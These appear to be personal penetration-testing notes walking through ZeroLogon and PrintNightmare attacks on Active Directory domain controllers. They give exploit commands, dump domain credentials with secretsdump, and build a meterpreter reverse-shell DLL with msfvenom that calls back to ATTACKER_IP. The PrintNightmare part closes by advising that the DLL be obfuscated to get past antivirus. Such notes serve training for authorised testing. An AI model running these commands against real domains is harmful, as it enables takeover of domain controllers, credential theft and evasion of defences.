There are new and recent vulnerabilities in Active Directory such as:
- `ZeroLogon` (if not executed in the right way can destroy the domain)
- `PrintNightmare`
- `Sam the Admin`

It has sense to check for them in the environment.

These vulnerbilities are very severe and can be dangerous for the domain.



# Abusing ZeroLogon
**==This type of attack can set the domain controller password to `null` and give then completely access to it.==**

==**But if we don't restore the password we will destroy the domain.**==

The attack is based on a problem on the cryptography and it is very complex.



First of all we need the exploit that can be found here [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

Another important tool we need to use to understand if the domain controller is vulnerable to this attack is [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)

## Step 1 : run the checker
All we need to do is to run the tester with the domain controller name and the IP:
```bash
python3 zerologon_checker.py DOMAIN_C_NAME D_C_IP
```
- ![[Pasted image 20241221154211.png]]

This tells us if it is vulnerable. In general we can stop here since the attack is very dangerous.


## Step 2 : run the attack
Now we can run the attack in this way:
```bash
python3 cve-2020-1472-exploit.py DOMAIN_C_NAME DOMAIN_C_NAME
```
- ![[Pasted image 20241221154456.png]]


At this point we cna use `secretsdump` to see if worked.
```bash 
secretsdump.py --just-dc DOMAIN/DOMAIN_C_NAME\$@D_C_IP
```
- we just need to push `enter` and we are in
- ![[Pasted image 20241221154658.png]]


So we have all the infomration now and we are in.


## Step 3 : restore the machine

**==It is very important, otherwise we corrupt the system.==**

At this point we get the administrator hash (the last part) from the results of the command `secretsdump` and we run:
```bash
secretsdump.py administrator@DOMAIN_C_IP -hashes ADMIN_HASH
```
- ![[Pasted image 20241221154927.png]]


From here we need to get the `plain_password_hex` and use it to restore the password:
- ![[Pasted image 20241221155036.png]]


At this point we have to run the `restorepassword` tool contained in the folder:
```bash
python3 restorepassword.py DOMAIN/DC_NAME@DC_NAME -target-ip DC_IP -hexpass HEX_PASS
```
- ![[Pasted image 20241221155230.png]]



# PrintNightmare attack
**==This attack takes advantages of the printer spooler (used to add printers and so on).==**
The problem is that it is run with privilege on the system.

So this attacks allows to execute code in a privilege mode.

We need to use the tool [[https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)]([https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675))
## Step 1 : check if vulnerable
To check if it is vulnerable to this CVE we have to run:
```bash
rpcdump.py @DOMAIN_C_IP | egrep 'MS-RPRN|MS-PAR'
```
- ![[Pasted image 20241221155739.png]]


If we see this print, it is vulnerable.

## Step 2 :  setup for the attack

First of all we need to install `impacket` (a specific version contianed in the tool):
```bash

pip3 uninstall impacket

git clone https://github.com/cube0x0/impacket

cd impacket

python3 ./setup.py install

```


## Step 3 : use msfvenom to create a shell code to insert in a dll

For example we create a remote shell:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=ATTACKER_PORT -f dll > shell.dll
```
- ![[Pasted image 20241221160423.png]]

At this point we run a listener on msfconsole:
```bash
msfconsole

use multi/handler

set payload windows/x64/meterpreter/reverse_tcp

set lport PORT_USED_IN_THE_DLL

set lhost ATTACKER_IP

run
```


Perfect, now we need to setup a fileshare, in order to shell the `shell.dll` so we can do:
```bash
cd impacket

smbserver.py share `pwd`-smb2support

```


## Step 3 : run the attack
To run the attack we can just do:
```bash
python3 CVE-2021-1675.py DOMAIN/unsername:PASSWORD@DC_IP '\\ATTACKER_IP\share\shell.dll'
```
- ![[Pasted image 20241221160928.png]]

If we have an error we need to run the `smbserver` as smb2support. It would be:
- ![[Pasted image 20241221161149.png]]

GENERALLY ANTIVIRUS WILL BLOCK US!

If not we could execute commands:
- ![[Pasted image 20241221161309.png]]

<mark style="background: #FF5582A6;">We just need to obfuscate the dll file to bypass the antivirus.</mark>
- with `msfconsole` we can do it




